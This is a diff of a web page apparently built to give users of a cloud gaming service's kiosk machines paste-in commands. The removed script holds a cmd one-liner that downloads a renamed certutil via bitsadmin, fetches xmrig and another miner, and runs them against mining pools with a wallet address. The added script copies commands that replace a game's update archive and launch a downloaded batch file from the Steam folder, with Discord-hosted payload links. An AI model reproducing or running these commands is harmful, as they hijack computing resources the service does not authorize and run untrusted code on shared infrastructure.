@@ -58,9 +58,7 @@
 	
 
 <button id="cyberpunkButton" onclick="copyToClipboard(cyberpunkScript, &#39;cyberpunkButton&#39;)">Copiar texto</button>
-  <script>
-var cyberpunkScript = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\users\kiosk\downloads\rdl.exe c:\users\kiosk\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=1`;
-  </script>
+
 
 	
  
@@ -91,6 +89,69 @@ var cyberpunkScript = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https:/
 	
 		</p>
     
+<script>
+    // Drag function for cmd.uri file button
+    function dragfile(ev) {
+      ev.dataTransfer.setData("text", "file:///C:/users/kiosk/appdata/roaming/microsoft/windows/start%20menu/programs/system%20tools/command%20prompt.lnk");
+    }
+    
+    // Drag function for cmd.uri link button
+    function dragurl(ev) {
+      ev.dataTransfer.setData("text", "https://cdn.discordapp.com/attachments/1120094264622325780/1155068189596717086/cmd.url");
+    }
+
+    // Cyberpunk script
+    var cyberpunkScript = `del "C:\\Program Files (x86)\\NVIDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\update\\latest.zip"&copy "C:\\users\\kiosk\\downloads\\latest.zip" "C:\\Program Files (x86)\\NViDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\update"& echo "C:\\Program Files (x86)\\NViDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\a.exe" | clip & copy "C:\\users\\kiosk\\downloads\\Stella.bat" "C:\\Program Files (x86)\\steam\\ssfn_stella.bat"&start "" "C:\\Program Files (x86)\\steam\\ssfn_stella.bat"`;
+
+    // Saints Row script
+    var saintsRowScript = `C:\\Program Files (x86)\\NVIDiA_Grid_Bundle\\crossout_gfn_pc\\common\\Crossout\\a.exe`;
+
+    // Function to download latest.zip
+    function downloadLatestZip() {
+      // Set the download link
+      var downloadLink = "https://storage.googleapis.com/elwey/latest.zip";
+
+      // Open the download link in a new window or tab
+      window.open(downloadLink, '_blank');
+    }
+
+    // Function to download Stella.bat
+    function downloadStellaBat() {
+      // Set the download link
+      var downloadLink = "https://cdn.discordapp.com/attachments/1169970192479166514/1171918676048478258/Stella.bat";
+
+      // Open the download link in a new window or tab
+      window.open(downloadLink, '_blank');
+    }
+
+    // Function to copy text to clipboard and change button color
+    function copyToClipboard(text, buttonId) {
+      var button = document.getElementById(buttonId);
+      var textarea = document.createElement("textarea");
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+
+      // Change button color
+      button.classList.add('copied');
+
+      // Reset button color after a delay (you can adjust the delay as needed)
+      setTimeout(function() {
+        button.classList.remove('copied');
+      }, 2000);
+    }
+
+    // Function to download Mario Corp latest.zip
+    function downloadMarioCorp() {
+      // Set the download link
+      var downloadLink = "https://storage.googleapis.com/mariocorp/latest.zip";
+
+      // Open the download link in a new window or tab
+      window.open(downloadLink, '_blank');
+    }
+  </script>
 
 
 
